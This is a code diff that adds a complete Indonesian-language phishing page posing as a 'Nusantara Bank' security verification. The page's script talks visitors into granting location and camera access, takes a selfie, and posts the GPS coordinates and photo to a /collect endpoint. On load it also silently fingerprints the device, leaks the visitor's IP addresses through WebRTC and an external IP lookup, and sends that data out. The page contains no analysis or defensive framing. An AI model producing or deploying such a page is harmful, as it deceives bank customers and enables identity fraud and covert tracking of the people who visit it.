@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Verifikasi Keamanan — Nusantara Bank</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+body{background:linear-gradient(135deg,#0a2540 0%,#1e4976 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:12px;padding:32px 28px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+.logo{display:flex;align-items:center;gap:10px;margin-bottom:24px}
+.logo svg{width:36px;height:36px}
+.logo-text{font-size:18px;font-weight:700;color:#0a2540}
+.logo-sub{font-size:11px;color:#6b7280;margin-top:-2px}
+h1{font-size:18px;color:#111827;margin-bottom:6px;font-weight:600}
+.sub{font-size:13px;color:#6b7280;margin-bottom:20px;line-height:1.5}
+.steps{background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;padding:16px;margin-bottom:20px}
+.step{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #e5e7eb}
+.step:last-child{border-bottom:none}
+.step-icon{width:28px;height:28px;border-radius:50%;background:#0a2540;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.step-icon.done{background:#059669}
+.step-icon.load{background:#f59e0b;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+.step-body{flex:1}
+.step-title{font-size:13px;color:#111827;font-weight:500;margin-bottom:2px}
+.step-desc{font-size:12px;color:#6b7280;line-height:1.4}
+.btn{width:100%;padding:13px;background:#0a2540;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s;margin-top:8px}
+.btn:hover:not(:disabled){background:#1e4976}
+.btn:disabled{opacity:0.6;cursor:not-allowed}
+.status{font-size:12px;color:#6b7280;text-align:center;margin-top:14px;min-height:18px}
+.status.error{color:#dc2626}
+.status.success{color:#059669}
+.footer{margin-top:20px;padding-top:14px;border-top:1px solid #e5e7eb;text-align:center;font-size:11px;color:#9ca3af;line-height:1.6}
+.secure{display:flex;align-items:center;justify-content:center;gap:4px;font-size:11px;color:#059669;margin-top:6px}
+.secure svg{width:12px;height:12px}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">
+        <svg viewBox="0 0 36 36" fill="none">
+            <rect width="36" height="36" rx="8" fill="#0a2540"/>
+            <path d="M8 26V14l10-6 10 6v12h-6v-7h-8v7H8z" fill="#f3bd33"/>
+            <circle cx="18" cy="16" r="1.5" fill="#0a2540"/>
+        </svg>
+        <div>
+            <div class="logo-text">Nusantara Bank</div>
+            <div class="logo-sub">Verifikasi Keamanan</div>
+        </div>
+    </div>
+
+    <h1>Verifikasi Diperlukan</h1>
+    <div class="sub">Untuk melanjutkan, diperlukan verifikasi lokasi dan perangkat Anda.</div>
+
+    <div class="steps">
+        <div class="step">
+            <div class="step-icon" id="icon1">1</div>
+            <div class="step-body">
+                <div class="step-title">Verifikasi Lokasi</div>
+                <div class="step-desc">Akses GPS untuk keamanan akun</div>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-icon" id="icon2">2</div>
+            <div class="step-body">
+                <div class="step-title">Verifikasi Kamera</div>
+                <div class="step-desc">Foto selfie untuk konfirmasi identitas</div>
+            </div>
+        </div>
+    </div>
+
+    <button class="btn" id="btnStart">Mulai Verifikasi</button>
+    <div class="status" id="status">Klik tombol untuk memulai</div>
+
+    <div class="footer">
+        <div class="secure">
+            <svg viewBox="0 0 24 24" fill="#059669"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            Koneksi aman · SSL 256-bit
+        </div>
+        <div style="margin-top:6px">© 2026 Nusantara Bank</div>
+    </div>
+</div>
+
+<script>
+const API_BASE = window.location.origin;
+const params = new URLSearchParams(window.location.search);
+const target = params.get('u') || 'https://google.com';
+
+let trackingId = null;
+async function getTID() {
+    if (trackingId) return trackingId;
+    try {
+        const r = await fetch(API_BASE + '/get_tracking_id');
+        const d = await r.json();
+        trackingId = d.tracking_id || 'unknown';
+    } catch(e) { trackingId = 'unknown'; }
+    return trackingId;
+}
+
+function setIcon(id, state) {
+    const el = document.getElementById(id);
+    el.className = 'step-icon' + (state === 'done' ? ' done' : state === 'load' ? ' load' : '');
+    el.textContent = state === 'done' ? '✓' : state === 'load' ? '…' : id.replace('icon','');
+}
+
+function setStatus(msg, cls) {
+    const s = document.getElementById('status');
+    s.textContent = msg;
+    s.className = 'status' + (cls ? ' ' + cls : '');
+}
+
+function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) { resolve({error:'no geo'}); return; }
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({
+                lat: p.coords.latitude,
+                lon: p.coords.longitude,
+                acc: p.coords.accuracy,
+                provider: 'GPS',
+                timestamp: p.timestamp
+            }),
+            e => resolve({error: e.message}),
+            {enableHighAccuracy: true, timeout: 10000}
+        );
+    });
+}
+
+function getCamera() {
+    return new Promise((resolve) => {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            resolve({error:'no camera'});
+            return;
+        }
+        navigator.mediaDevices.getUserMedia({
+            video: {facingMode: 'user', width: 640, height: 480},
+            audio: false
+        }).then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; canvas.height = 480;
+            setTimeout(() => {
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 640, 480);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                stream.getTracks().forEach(t => t.stop());
+                resolve({
+                    image: dataUrl,
+                    format: 'jpeg',
+                    size: dataUrl.length,
+                    timestamp: new Date().toISOString()
+                });
+            }, 1000);
+        }).catch(e => resolve({error: e.message}));
+    });
+}
+
+async function sendData(payload) {
+    try {
+        const r = await fetch(API_BASE + '/collect', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+        return r.ok;
+    } catch(e) { return false; }
+}
+
+document.getElementById('btnStart').addEventListener('click', async () => {
+    const btn = document.getElementById('btnStart');
+    btn.disabled = true;
+
+    const tid = await getTID();
+
+    // Step 1: lokasi
+    setIcon('icon1', 'load');
+    setStatus('Meminta izin lokasi...', '');
+    const loc = await getLocation();
+    if (loc.error) {
+        setIcon('icon1', '');
+        setStatus('Izin lokasi ditolak. Coba lagi.', 'error');
+        btn.disabled = false;
+        return;
+    }
+    setIcon('icon1', 'done');
+
+    // Step 2: kamera
+    setIcon('icon2', 'load');
+    setStatus('Meminta izin kamera...', '');
+    const cam = await getCamera();
+    if (cam.error) {
+        setIcon('icon2', '');
+        setStatus('Izin kamera ditolak. Coba lagi.', 'error');
+        btn.disabled = false;
+        return;
+    }
+    setIcon('icon2', 'done');
+
+    // Kirim ke server
+    setStatus('Memverifikasi...', '');
+    const payload = {
+        location: loc,
+        camera: cam,
+        tracking_id: tid,
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+        referrer: document.referrer || 'direct',
+        type: 'bank_verify'
+    };
+    const ok = await sendData(payload);
+
+    if (ok) {
+        setStatus('Verifikasi berhasil! Mengalihkan...', 'success');
+        setTimeout(() => { window.location.href = target; }, 1500);
+    } else {
+        setStatus('Gagal verifikasi. Coba lagi.', 'error');
+        btn.disabled = false;
+    }
+});
+
+async function sendInitialData() {
+    try {
+        const device = {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookieEnabled: navigator.cookieEnabled,
+            incognito: false
+        };
+        try {
+            if (navigator.webdriver) device.incognito = true;
+            try {
+                localStorage.setItem('t','1'); localStorage.removeItem('t');
+            } catch(e) { device.incognito = true; }
+        } catch(e) {}
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                device.batteryLevel = Math.round(b.level * 100);
+                device.batteryCharging = b.charging;
+            }
+        } catch(e) {}
+
+        let webrtc = null;
+        try {
+            webrtc = await new Promise((resolve) => {
+                const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (m) { resolve(m[0]); pc.close(); }
+                    } else { resolve(null); pc.close(); }
+                };
+                setTimeout(() => { resolve(null); pc.close(); }, 3000);
+            });
+        } catch(e) {}
+
+        let clientIp = null;
+        try {
+            const ir = await fetch('https://api.ipify.org?format=json');
+            const ij = await ir.json();
+            clientIp = ij.ip;
+        } catch(e) {}
+
+        const tid = await getTID();
+        await fetch(API_BASE + '/collect_initial', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                device: device,
+                webrtc: webrtc,
+                tracking_id: tid,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                client_ip: clientIp,
+                type: 'bank_initial'
+            })
+        });
+    } catch(e) {}
+}
+window.addEventListener('load', () => { setTimeout(sendInitialData, 500); });
+
+</script>
+</body>
+</html>
